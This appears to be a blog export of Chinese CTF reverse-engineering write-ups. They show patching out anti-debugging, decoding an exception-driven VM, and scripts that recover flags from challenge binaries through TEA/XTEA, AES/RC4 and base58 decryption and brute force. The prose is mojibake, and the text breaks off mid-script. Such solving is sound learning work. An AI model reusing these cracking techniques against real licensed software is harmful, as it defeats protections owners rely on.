ç»è¿‡å¤šæ¬¡ä¸‹æ–­ç‚¹è°ƒè¯•åï¼Œå®šä½åˆ°å‡½æ•°sub_413D10ï¼Œä¿®æ”¹è¿‡åå°±å¯ä»¥è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªå‘ã€‚ã€‚ æ¯æ¬¡è°ƒè¯•åˆ°è¿™é‡Œçš„æ—¶å€™éƒ½ä¼šé—ªé€€ï¼Œæ— è®ºæ€ä¹ˆè°ƒéƒ½æ²¡æœ‰ç”¨ï¼Œæœ€åæˆ‘é€‰æ‹©çš„åŠæ³•æ˜¯ç›´æ¥patchæ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æŒ‡ä»¤ï¼Œå› ä¸ºè¿™æ­¥æ¯”è¾ƒç®€å•ï¼Œä¸”ä¸å½±å“åé¢çš„æ•°æ®ã€‚ åœ¨å¯ä»¥åŠ¨è°ƒåï¼Œå°±å¯ä»¥åˆ†æç®—æ³•äº†ï¼Œç®—æ³•æœ‰ä¸¤å¤„ï¼Œä¸€å¤„å¼‚æˆ–ï¼Œä¸€å¤„teaåŠ å¯†ï¼Œå¼‚æˆ–å‡½æ•°æˆ‘å°†ä»–pachï¼Œç›´æ¥çœ‹teaå¤„ teaåŠ å¯†çš„keyæ˜¯åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ï¼Œä½†æ˜¯å¦‚æœä¸åŠ¨æ€è°ƒè¯•ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶æ•´ä¸ªå‡½æ•°è·‘ä¸€éä¹Ÿå¯ä»¥ï¼Œæˆ‘å–œæ¬¢åŠ¨æ€è°ƒè¯•ï¼ˆæ‡’ï¼‰ ç”Ÿæˆäº†8ä¸ªæ•°æ®ï¼Œä½†æ˜¯åªç”¨åˆ°äº†å‰å››ä¸ªï¼Œåé¢åªéœ€è¦æ‰¾åˆ°åŠ å¯†åçš„æ•°æ®å°±okäº†ï¼Œè¿™é‡Œæˆ‘ç”¨idapython 1234567891011121314151617181920212223242526272829import idc from ida_bytes import *import idaapi def DumpCipher(): addr = [] res = [] start = 0x4122C8 end = 0x4123AE curr_addr = start dword = &#x27;&#x27; while curr_addr &lt;= end: addr.append(curr_addr) curr_addr = idc.next_head(curr_addr,end) for i in range(32): if i%4==0 and i != 0: print(dword) res.append(int(dword, 16)) dword = &#x27;&#x27; data = idc.print_operand(addr[i], 1).replace(&#x27;h&#x27;, &#x27;&#x27;) if len(data) == 1: data = &#x27;0&#x27; + data elif len(data) == 3: data = data[1:] dword = dword + data # print(dword) res.append(int(dword, 16)) print(res) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void TEA_decrypt(uint32_t* v, uint32_t* k)&#123; uint32_t sum = 0xC6EF3720, delta = 0x9E3779B9; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;void XOR(uint32_t *arr) &#123; uint32_t sum = 0x73FF8CA6; for (int i = 0; i &lt; 8; i++) &#123; arr[i] ^= sum; sum -= 0x50FFE544; &#125; &#125;int main()&#123; uint32_t key[4] = &#123; 0x82aba3fe, 0xac1ddca8, 0x87ec6b60, 0xa2394568 &#125;; uint32_t c1[2] = &#123; 3991505723, 3531991019 &#125;; uint32_t c2[2] = &#123; 1360416890, 2984008969 &#125;; uint32_t c3[2] = &#123; 1169078549, 1301151568 &#125;; uint32_t c4[2] = &#123; 3739270283, 2612854497 &#125;; uint32_t v = 0; TEA_decrypt(c1, key); TEA_decrypt(c2, key); TEA_decrypt(c3, key); TEA_decrypt(c4, key); uint32_t arr[] = &#123; 0x3e9affcb, 0x478dce18, 0xb891a541, 0xc191b885, 0x6b9a84ff, 0xad61703e, 0xeb5f6c7d, 0x62772dbb &#125;; XOR(arr); for (int i = 0; i &lt; 8; i++) &#123; printf(&quot;%x&quot;, arr[i]); &#125; //æ‰“å°çš„æ˜¯flagçš„16è¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œå†ç”¨pythonè½¬æˆå­—ç¬¦ä¸² return 0;&#125; flag: Mesmerizing_And_Desirable_As_wjq Enigmaè¿™é¢˜æœ‰æ„æ€ å¼‚å¸¸å¤„ç†åè°ƒè¯•ï¼Œå‡½æ•°sub_AE10C0è°ƒç”¨äº†SetUnhandledExceptionFilterå‡½æ•°ï¼Œæ„æ€å°±æ˜¯å‘ç”Ÿå¼‚å¸¸æ—¶è°ƒç”¨æ³¨å†Œçš„å‡½æ•°ï¼Œçœ‹çœ‹æ³¨å†Œçš„å‡½æ•° æ³¨å†Œçš„å‡½æ•°æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œä½†æ˜¯è¿™ä¸ªè™šæ‹Ÿæœºå¾ˆç‰¹æ®Šï¼Œé‡Œé¢çš„handlæ˜¯åŠ å‡è¿ç®—å’Œä½è¿ç®—ï¼Œå‚æ•°æ˜¯å„ç§å¯„å­˜å™¨ å›åˆ°å‡½æ•°sub_AE10C0å‘ç°äº†C7è¿™ä¸ªå­—èŠ‚ç è§¦å‘éæ³•æŒ‡ä»¤å¼‚å¸¸ï¼Œç„¶åè°ƒç”¨æ³¨å†Œçš„å‡½æ•°ç›¸å½“äºç”¨é‚£ä¸ªè™šæ‹Ÿæœºæ¨¡æ‹Ÿäº†ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œç›´æ¥è¿˜åŸåé™æ€çœ‹æ±‡ç¼–å°±OK 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130 push ebp.text:004018F1 mov ebp, esp.text:004018F3 push ebx.text:004018F4 push esi.text:004018F5 push edi.text:004018F6 push offset sub_401630.text:004018FB call ds:SetUnhandledExceptionFilter.text:004018FB ; ---------------------------------------------------------------------------.text:00401901 db 0C7h ; and eax, 0.text:00401902 db 0FFh.text:00401903 db 4 .text:00401904 db 1.text:00401905 db 0.text:00401906 ; ---------------------------------------------------------------------------.text:00401906 xor ecx, ecx.text:00401908.text:00401908 loc_401908: ; CODE XREF: .text:00401922â†“j.text:00401908 cmp ecx, 20h ; &#x27; &#x27;.text:0040190B jge short loc_401924.text:0040190B ; ---------------------------------------------------------------------------.text:0040190D db 0C7h ; add eax, 11h.text:0040190E db 0FFh .text:0040190F db 0.text:00401910 db 1.text:00401911 db 11h.text:00401912 db 0C7h ; and eax,1Fh.text:00401913 db 0FFh.text:00401914 db 4.text:00401915 db 1.text:00401916 db 1Fh.text:00401917 ; ---------------------------------------------------------------------------.text:00401917 mov dword ptr (byte_457A4C+24h)[ecx*4], eax.text:00401917 ; ---------------------------------------------------------------------------.text:0040191E db 0C7h ; inc ecx.text:0040191F db 0FFh.text:00401920 db 2.text:00401921 db 3.text:00401922 ; ---------------------------------------------------------------------------.text:00401922 jmp short loc_401908.text:00401924 ; ---------------------------------------------------------------------------.text:00401924.text:00401924 loc_401924: ; CODE XREF: .text:0040190Bâ†‘j.text:00401924 xor ecx, ecx.text:00401926.text:00401926 loc_401926: ; CODE XREF: .text:00401956â†“j.text:00401926 cmp ecx, 20h ; &#x27; &#x27;.text:00401929 jge short loc_401958.text:0040192B mov ebx, dword ptr (byte_457A4C+24h)[ecx*4].text:00401932 mov edx, dword ptr (byte_457A4C+28h)[ecx*4].text:00401939 mov al, byte_457A4C[edx].text:0040193F mov byte_4579E0[ebx], al.text:00401945 mov al, byte_457A4C[ebx].text:0040194B mov byte_4579E0[edx], al.text:0040194B ; ---------------------------------------------------------------------------.text:00401951 db 0C7h.text:00401952 db 0FFh ; add ecx, 2.text:00401953 db 0.text:00401954 db 3.text:00401955 db 2.text:00401956 ; ---------------------------------------------------------------------------.text:00401956 jmp short loc_401926.text:00401958 ; ---------------------------------------------------------------------------.text:00401958.text:00401958 loc_401958: ; CODE XREF: .text:00401929â†‘j.text:00401958 xor ecx, ecx.text:0040195A.text:0040195A loc_40195A: ; CODE XREF: .text:00401992â†“j.text:0040195A cmp ecx, 20h ; &#x27; &#x27;.text:0040195D jge short loc_401994.text:0040195F mov bl, byte_4579E0[ecx].text:0040195F ; ---------------------------------------------------------------------------.text:00401965 db 0C7h ; and ebx, 1Fh.text:00401966 db 0FFh.text:00401967 db 4.text:00401968 db 2.text:00401969 db 1Fh.text:0040196A db 0C7h ; shl bl, 3.text:0040196B db 0FFh.text:0040196C db 7.text:0040196D db 2.text:0040196E db 3.text:0040196F ; ---------------------------------------------------------------------------.text:0040196F mov esi, ecx.text:00401971 inc esi.text:00401972 and esi, 1Fh.text:00401975 mov dl, byte_4579E0[esi].text:0040197B and dl, 0E0h.text:0040197E and edx, 0FFh.text:0040197E ; ---------------------------------------------------------------------------.text:00401984 db 0C7h ; shr dl, 5 .text:00401985 db 0FFh.text:00401986 db 8.text:00401987 db 4.text:00401988 db 5.text:00401989 ; ---------------------------------------------------------------------------.text:00401989 or bl, dl.text:0040198B mov byte_457A04[ecx], bl.text:00401991 inc ecx.text:00401992 jmp short loc_40195A.text:00401994 ; ---------------------------------------------------------------------------.text:00401994.text:00401994 loc_401994: ; CODE XREF: .text:0040195Dâ†‘j.text:00401994 mov al, byte_457A04.text:00401999 mov byte_457A28, al.text:0040199E mov ecx, 1.text:004019A3.text:004019A3 loc_4019A3: ; CODE XREF: .text:004019CEâ†“j.text:004019A3 cmp ecx, 20h ; &#x27; &#x27;.text:004019A6 jge short loc_4019D0.text:004019A8 mov bl, byte_457A04[ecx].text:004019AE mov esi, ecx.text:004019AE ; ---------------------------------------------------------------------------.text:004019B0 db 0C7h ; inc ecx.text:004019B1 db 0FFh .text:004019B2 db 3 .text:004019B3 db 5.text:004019B4 ; ---------------------------------------------------------------------------.text:004019B4 xor bl, byte_457A04[esi].text:004019BA mov esi, ecx.text:004019BA ; ---------------------------------------------------------------------------.text:004019BC db 0C7h ; and esi, 3 .text:004019BD db 0FFh .text:004019BE db 4 .text:004019BF db 5.text:004019C0 db 3.text:004019C1 ; ---------------------------------------------------------------------------.text:004019C1 xor bl, byte ptr aBier[esi] ; &quot;Bier&quot;.text:004019C7 mov byte_457A28[ecx], bl.text:004019CD inc ecx.text:004019CE jmp short loc_4019A3 åŠ å¯†è¿‡ç¨‹ä¸å¤æ‚ï¼Œé¦–å…ˆè®¡ç®—äº†ä¸€ç»„0åˆ°31çš„æ— åºæ•°ï¼Œç„¶åæŒ‰ç…§æ— åºæ•°ä¸¤ä¸ªä¸€ç»„äº¤æ¢è¾“å…¥æ•°æ®ï¼Œæ¥ç€è¿›è¡Œä½è¿ç®—ï¼Œæ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼Œæœ€åè¿›è¡Œäº†å¼‚æˆ–åŠ å¯†ã€‚ 12345678910111213# è§£å¼‚æˆ–åŠ å¯†çš„è„šæœ¬def xor(): res = [] key = &#x27;Bier&#x27; Cipher = &#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27; for i in range(0,len(Cipher),2): res.append(int(Cipher[i:i+2], 16)) for i in range(1,len(res)): res[i] = res[i] ^ ord(key[(i)%4]) ^ res[i-1] return res# [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59] 123456789101112131415161718192021// ä½è¿ç®—è„šæœ¬#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; BYTE byte[] = &#123; 147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59 &#125;; BYTE index = 0; unsigned char first = byte[0] &gt;&gt; 3; printf(&quot;%c&quot;, (147 &gt;&gt;3)&amp;0xFF | (59 &lt;&lt;5)&amp;0xFF); for (int i = 0; i &lt; 31; i++) &#123; BYTE x = (byte[i] &lt;&lt; 5) &amp; 0xFF; BYTE y = (byte[i + 1] &gt;&gt; 3) &amp; 0xFF; printf(&quot;%c&quot;, x | y); &#125;&#125;// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg 1234567891011121314# äº¤æ¢ä½ç½®def Change(): flag = list(&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;) index = [] num = 0 for i in range(32): num += 0x11 num &amp;= 0x1F index.append(num) for i in range(0,32,2): flag[index[i]], flag[index[i+1]] = flag[index[i+1]], flag[index[i]] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;) flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr. æ€»ç»“â€‹ è¿™é“é¢˜è¿‡ç¨‹ä¸å¤æ‚ï¼Œè°ƒç”¨äº†SetUnhandledExceptionFilterï¼Œæ³¨å†Œå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œé€šè¿‡C7è¿™ä¸ªéæ³•æŒ‡ä»¤è§¦å‘å¼‚å¸¸ï¼Œè¿è¡Œè¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œä»è€Œè¿›è¡ŒåŠ å¯†æ“ä½œ â€‹ å¦‚æœæƒ³åŠ¨æ€è°ƒè¯•çš„è¯å¯ä»¥ç›´æ¥æ”¹å­—èŠ‚ç ï¼ˆæˆ‘åªä¼šè¿™ä¸€ç§æ–¹æ³•ã€‚ã€‚ï¼‰ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ï¼Œä½†æ˜¯åšé¢˜çš„æ—¶å€™éœ€è¦ç»†å¿ƒä¸€ç‚¹ï¼Œå› ä¸ºæ±‡ç¼–çš„ä¸€äº›è¿‡ç¨‹æ²¡æœ‰çœ‹æ¸…å¯¼è‡´æµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´ obfuæˆ‘æå¾—æœ€çƒ¦çš„ä¸€é“é¢˜ã€‚ã€‚ä»¥å‰æ²¡æœ‰æè¿‡å¸¦ivçš„AESï¼Œä¹Ÿä»æ¥æ²¡æœ‰çœ‹è¿‡sha256å’Œmd5çš„åç¼–è¯‘ä»£ç ï¼Œè¿™æ¬¡ç®—æ˜¯é‡åˆ°äº†ã€‚ã€‚çœ‹äº†å¾ˆä¹…éƒ½æ²¡æœ‰çœ‹å‡ºæ¥ï¼Œæœ€åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‡ºæ¥çš„ã€‚å…¶å®è¿™é“é¢˜çŸ¥é“äº†md5å’Œsha256ä¹‹ååŠ å¯†è¿‡ç¨‹å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°é‚£å°±æ¼ç«äº†ï¼ˆæ¯”å¦‚åƒæˆ‘ï¼‰ æ€»å…±ç®—ä¸‹æ¥è¿™é“é¢˜ä¸€å…±æœ‰5ä¸ªæ­¥éª¤ å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ æ‰“ä¸ªæ¯”æ–¹ï¼šæ¯”å¦‚æˆ‘ä»¬è¾“å…¥123456ï¼Œé‚£ä¹ˆç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„è½¬ä¸º 12 23 45è¿™ä¸‰ä¸ª16è¿›åˆ¶æ•°è¿›è¡Œä¿å­˜ï¼Œå› æ­¤å‰é¢åªå…è®¸è¾“å…¥0-9 a-fçš„å­—ç¬¦ ä½è¿ç®— æ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼ˆæˆ‘æ€€ç–‘è¿™æ¬¡çš„é¢˜æ˜¯ä¸€ä¸ªäººå‡ºçš„ï¼ŒåŠ å¯†ç®—æ³•éƒ½å¥½ç›¸ä¼¼ã€‚ã€‚ï¼‰ è®¡ç®—keyå’Œiv rc4å’ŒAES æ³¨æ„AESæ˜¯è§£å¯†ï¼Œé¢˜ç›®ç”¨çš„æ˜¯Resç›’å­ï¼Œå¹¶ä¸æ˜¯å¸¸è§„çš„Sç›’å­ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™è„šæœ¬çš„æ—¶å€™æ˜¯åŠ å¯† 5.ä¸ç”¨md5ç”Ÿæˆçš„åºåˆ—æ¯”è¾ƒ å¦‚æœåºåˆ—å·æ¯”å¯¹æˆåŠŸï¼Œç¨‹åºå°±ä¼šè¯»å–flag.encä¸­çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæˆ‘ä»¬è¾“å…¥ç„¶åé€šè¿‡åŠ å¯†è®¡ç®—å¾—åˆ°çš„åºåˆ—å·å°±ä¼šä½œä¸ºkeyè§£å¯†flag.encçš„äºŒè¿›åˆ¶æ•°æ®æµï¼ŒåŒæ ·ä¹Ÿæ˜¯AES CBCæ¨¡å¼ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ä¸ç”¨æˆ‘ä»¬å…³å¿ƒï¼Œæˆ‘ä»¬åªéœ€è¦å¾—åˆ°æ­£ç¡®çš„åºåˆ—å·å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536import hashlibimport binasciifrom Cryptodome.Cipher import AES,ARC4flag = &#x27;&#x27;string = b&#x27;admin&#x27;new_res = [0x8c]Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())digest = hashlib.sha256(string).hexdigest()res = [i for i in binascii.unhexlify(digest)]for i in range(1,32): new_res.append(res[i] ^ res[i - 1])# aesåŠ å¯†key = binascii.a2b_hex((bytes(new_res).hex()[:32]).encode())iv = binascii.a2b_hex((bytes(new_res).hex()[32:]).encode())aes = AES.new(key, AES.MODE_CBC, iv)Cipher_AES = aes.encrypt(Plain_AES)# rc4åŠ å¯†rc4_cipher = Cipher_AESrc4 = ARC4.new(key)rc4_plain = rc4.decrypt(rc4_cipher)print(rc4_plain)# ä½è¿ç®—big_num_hex = binascii.hexlify(rc4_plain)big_num_bin = bin(int(big_num_hex, 16))[2:].rjust(16*8,&#x27;0&#x27;)big_num_bin = big_num_bin[3:] + big_num_bin[:3]for i in range(16): flag += hex(int(big_num_bin[i*8:i*8+8],2))[2:].rjust(2,&#x27;0&#x27;)print(flag)# 653b987431e5a2fc7c3d748fba008869 å¤ç°æ€»ç»“ å¸¸è§çš„åŠ å¯†ç®—æ³•ç‰¹å¾ä¸æ¸…æ¥šï¼ˆå¤§é—®é¢˜ï¼‰ çœ‹æ±‡ç¼–ä¸ä»”ç»†ï¼ˆéœ€è¦æ”¹æ‰è‡ªå·±ç²—å¿ƒçš„æ¯›ç—…ï¼‰ windowsæ–¹é¢çŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿ é¢˜å‹è§å¾—å¤ªå°‘äº†ï¼Œæ„Ÿè§‰åšäº†ä¸€é“é¢˜å°±ç´¯çš„è¦æ­»ğŸ˜‘ï¼ŒçœŸçš„ä½©æœæ¯”èµ›ä»å¼€å§‹è‚åˆ°æœ€åçš„å¸ˆå‚…ä»¬ å­¦ä¹ äº†æ€ä¹ˆä½¿ç”¨Cryptdomeåº“ï¼Œwindowsçš„å‡ ç§åè°ƒè¯•ï¼ˆå¼‚å¸¸æ³¨å†Œï¼Œdebug bloker)ï¼Œä¸‹æ¬¡åœ¨é‡åˆ°å°±ä¸ä¼šè¿™ä¹ˆç—›è‹¦äº†å§ï¼ˆå¤§æ¦‚ï¼‰","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"çº¢æ˜è°·/è™ç¬¦CTF-reé¢˜è§£","slug":"ctf/wp/çº¢åè°·-è™ç¬¦CTF","date":"2021-07-14T04:44:17.040Z","updated":"2022-01-01T09:53:30.376Z","comments":true,"path":"5429/","link":"","permalink":"http://example.com/5429/","excerpt":"","text":"çº¢æ˜è°·-g0çœ‹åå­—å°±æ˜¯goè¯­è¨€é¢˜ç›®ï¼Œç”¨IDA-golang-helperè¿˜åŸç¬¦å·è¡¨ä¹‹åï¼Œçœ‹åˆ°åªæœ‰å‡ ä¸ªå‡½æ•°ï¼Œå…¶ä¸­main_Encodeå°±æ˜¯åŠ å¯†å‡½æ•° å‡½æ•°é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œè¾“å…¥é•¿åº¦ç­‰äº20ï¼Œæ‰“ä¹±ä½ç½®ï¼Œè¿›å…¥main_EncodeåŠ å¯†ï¼Œæœ€åè¿›å…¥main_fun1è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥çœ‹main_Encodeä¸­çš„åŠ å¯†ç®—æ³• åŠ¨æ€è°ƒè¯•åå‘ç°ä¸€å¼ è¡¨ï¼Œè¡¨çš„é•¿åº¦ä¸º58ä½ï¼Œåˆ¤æ–­ä¸ºæ¢è¡¨base58åŠ å¯† è¿›å…¥main_fun1å‡½æ•°ä¸­æ‰¾åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œæ³¨æ„ runtime_memequalè¿™ä¸ªæ¯”è¾ƒçš„å‡½æ•°éœ€è¦åœ¨æ±‡ç¼–ä¸­å¯»æ‰¾æ¯”è¾ƒçš„å­—ç¬¦ä¸²é¦–åœ°å€ï¼Œåœ¨ä¼ªä»£ç ä¸­æ˜¯æ‰¾ä¸åˆ°çš„ 123456789101112import base58Cipher = &#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;Plain = &#x27;&#x27;new_table = &#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;old_table = &#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;for i in range(len(Cipher)): Plain += old_table[new_table.index(Cipher[i])]print(base58.b58decode(Plain.encode()))# flag&#123;We1CTFc0m_2345&#125; è™ç¬¦-remipsæ¶æ„æ–‡ä»¶ï¼Œæœ¬æ¥æƒ³ç”¨qemuåŠ¨æ€è°ƒè¯•çš„ï¼Œä½†æ˜¯å¥½åƒè™šæ‹Ÿæœºçš„soæ–‡ä»¶å‡ºé—®é¢˜äº†ï¼Œå°±é™æ€åˆ†æç®—äº†ï¼Œåæ­£æœ‰IDA7.5ä¸æ€• çœ‹ä¼ªä»£ç å¾ˆæµ“åšçš„C++æ°”æ¯ï¼Œä¸¤æ¬¡åˆ¤æ–­ï¼Œpreå‡½æ•°é‡Œé¢è¿˜åˆ¤æ–­äº†è¾“å…¥çš„é•¿åº¦ server_check_redemption_codeå‡½æ•°å¤§æ¦‚çš„æ„æ€å°±æ˜¯ç”Ÿæˆä¸€å¼ å®½256é•¿å’Œå­—ç¬¦ä¸²é•¿åº¦ç›¸åŒçš„è¡¨ï¼Œå½“è¡¨çš„åˆ—å€¼ä¸è¾“å…¥çš„å­—ç¬¦ä¸²çš„ASCIIå€¼ç›¸åŒæ—¶å°±åšä¸€ä¸ªæ ‡è®°ï¼Œç”¨Cè¯­è¨€è¿˜åŸåçš„ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char string[] = &quot;&quot;; char input[] = &quot;&quot;; int string_len = strlen(string); int input_len = strlen(input); int* s = (int*)malloc(input_len &lt;&lt; 10);// input_len * 2^10 memset((void*)s, 0, input_len &lt;&lt; 10); int count = 0; for (int i = 1; i &lt; input_len; i++) &#123; for (int j = 0; j &lt; 256; j++) &#123; if (j != input[i]) &#123; s[256 * i + j] = s[256 * count + j]; //å…¶ä»–å…¨æ˜¯å¡«å……è¿™ä¸ª &#125; else s[256 * i + j] = i + 1; //æ¯ä¸€æ¬¡å¾ªç¯åªæ‰§è¡Œä¸€æ¬¡è¿™ä¸ª &#125; count = s[256 * count + input[i]]; //count=i+1 &#125; int sign = 0; for (int k = 0; k &lt; string_len; k++) &#123; sign = s[256 * sign + string[k]]; if (sign == input_len) &#123; printf(&quot;%d&quot;, k - input_len + 1); &#125; &#125;&#125; /// k-input_len+1=7 /// k=6+0xE= é¢˜ç›®ä¸­æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç”Ÿæˆäº†ä¸¤å¼ è¡¨ï¼Œä¸¤å¼ è¡¨ä¸­ç›¸åŒçš„å€¼å°±æ˜¯éœ€è¦è¾“å…¥çš„flag Ninja Must Die 3 Is A Cruel Game, So Hard For Me I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative. ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­ç›¸åŒçš„å€¼ä¸ºNinja Must Die è™ç¬¦-gocryptå˜ç§çš„xteaåœ¨å†™è„šæœ¬çš„æ—¶å€™å¿˜è®°äº†å°ç«¯å­˜å‚¨ï¼Œè¿™ä¸ªåœ°æ–¹æäº†å¾ˆä¹…ï¼Œä»¥åé‡åˆ°ä¸èƒ½åœ¨çŠ¯é”™è¯¯äº† ç”¨æ’ä»¶è¿˜åŸç¬¦å·è¡¨åçœ‹åˆ°å‡½æ•°å¹¶æ²¡æœ‰å¤šå°‘ï¼Œè¾“å…¥æ£€æµ‹å‡½æ•°main_checkï¼Œæ•°æ®åŠ å¯†å‡½æ•°main_main__ptr_myCipher_Encrypt main_checkå‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…æ¥è§„å®šflagè¾“å…¥çš„æ ¼å¼ 1æ­£åˆ™åŒ¹é…æ ¼å¼ï¼šflag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125; åœ¨è¿›å…¥main_checkè¿”å›ä¸€ä¸ªå€¼ç»™æ ‡å¿—ï¼Œåˆ¤æ–­æ˜¯å¦è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤ main__ptr_myCipher_Encryptå‡½æ•°ä¸­çš„åŠ å¯†ç®—æ³•å°±æ˜¯å˜ç§çš„xteaåŠ å¯†ï¼Œéšæœºæ•°å˜æˆäº†0x12345678 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void XTEA_decrypt(uint32_t rounds, uint32_t* v, uint32_t* k)&#123; uint32_t delta = 0x12345678; uint32_t sum = rounds * delta; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; uint32_t rounds = 32; uint32_t v[2][2] = &#123; &#123; 0x0ec311f0, 0x45c79af3 &#125;, &#123; 0xedf5d910, 0x542702cb &#125; &#125;; uint32_t k[4] = &#123; 0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f &#125;; XTEA_decrypt(rounds, v[0], k); XTEA_decrypt(rounds, v[1], k); printf(&quot;%x-%x\\n&quot;, v[0][0], v[0][1]); printf(&quot;%x-%x\\n&quot;, v[1][0], v[1][1]);&#125;//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125; è™ç¬¦-CrackMeè¿™ä¸ªé¢˜éœ€è¦è¾“å…¥ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥ååˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé•¿åº¦éœ€è¦17ä½ï¼Œè¾“å…¥åå°†è¾“å…¥çš„å­—ç¬¦ä¸²çš„å‰7ä½å’Œå10ä½åˆ†å‰²ï¼Œåˆ†åˆ«å­˜å‚¨åœ¨ä¸åŒçš„å†…å­˜ä¸­ ç¬¬äºŒæ¬¡è¾“å…¥éœ€è¦è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œåœ¨ç»è¿‡ä¸¤è½®ç®€å•çš„è®¡ç®—åä¸æŒ‡å®šçš„ä¸¤ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥å†™è„šæœ¬çˆ†ç ´ï¼Œæœ€åè®¡ç®—å‡ºéœ€è¦è¾“å…¥çš„å€¼ä¸º90038 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// çˆ†ç ´è„šæœ¬ï¼Œå•çº¿ç¨‹å¤§æ¦‚éœ€è¦åŠä¸ªå°æ—¶å·¦å³#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt; double cal(double a, double b)&#123; double _a; double var = 0.0; _a = a; a = pow(a, b - 1); *(&amp;var + 1) = *(&amp;a + 1); var = a / exp(_a); return var;&#125;int main(int argc, char* argv[])&#123; double input_num; for (int i = 0; i &lt; 99999; i++) &#123; input_num = i; printf(&quot;%d\\n&quot;, i); double v16 = 0.0, v17 = 0.0, v18 = 0.0, v19 = 0.0; int num1 = 0x13B03, num2 = 0x5A2; v19 = (double)((int)input_num / 0x305B) + 1.0; do &#123; v17 = v17 + cal(v18, v19) * 0.001; v18 = v18 + 0.001; &#125; while (v18 &lt;= 100.0); double v21 = 0.0; double v22 